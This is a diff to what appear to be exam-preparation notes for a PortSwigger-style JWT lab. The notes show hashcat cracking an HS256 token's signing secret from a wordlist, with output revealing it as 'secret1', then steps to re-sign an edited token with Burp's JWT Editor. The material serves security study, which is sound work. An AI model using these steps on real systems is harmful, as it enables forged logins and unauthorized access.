@@ -43,15 +43,16 @@ use burpsuite's extension called jwt editor, in HTTP history, any request that c
     - catch a jwt
     - use hashcat to bruteforce:
 
-    ```powershell
-    kali@kali:/mnt/d/Downloads/hashcat-5.1.0/hashcat-5.1.0$ ./hashcat64.exe -a 0 -m 16500 eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0 ./jwt.secrets.list
+    ```bash
+    ┌──(kali㉿kali)-[~/Desktop/exam-preparation]
+    └─$ hashcat -a 0 -m 16500 eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0 ./jwt/jwt.secrets.list 
 
-    kali@kali:/mnt/d/Downloads/hashcat-5.1.0/hashcat-5.1.0$ ./hashcat64.exe -a 0 -m 16500 eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0 ./jwt.secrets.list --show
-
-    eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV                                                                                                           V4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0:secret1
+    ┌──(kali㉿kali)-[~/Desktop/exam-preparation]
+    └─$ hashcat -a 0 -m 16500 eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0 ./jwt/jwt.secrets.list --show
+    eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0:secret1
     ```
 
-    - base64 decode key
+    - base64 encode key
     - generate new symmetric key using jwt editor, replace "k" with b64decoded key
     - edit jwt's body, sign with new generated key
     - send
